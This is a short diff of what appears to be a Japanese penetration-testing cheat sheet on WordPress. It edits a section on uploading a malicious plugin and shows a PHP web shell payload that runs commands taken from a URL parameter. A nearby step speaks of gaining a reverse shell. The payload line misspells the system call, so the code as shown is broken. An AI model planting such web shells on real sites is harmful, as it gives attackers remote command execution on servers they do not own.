@@ -143,13 +143,13 @@ zip <output_name> <file>
 
 4. アップロード→Activate Pluginし、リバースシェルを獲得
 
-#### WebShell
+#### WebShell w/ WordPressプラグイン
 
 1. ペイロードを作成
 ```php
 <?php 
 	/*
-	Plugin Name: [プラグイン名]
+	Plugin Name: プラグイン名]
 	*/
 
 echo sysetm($_GET["cmd"]); 
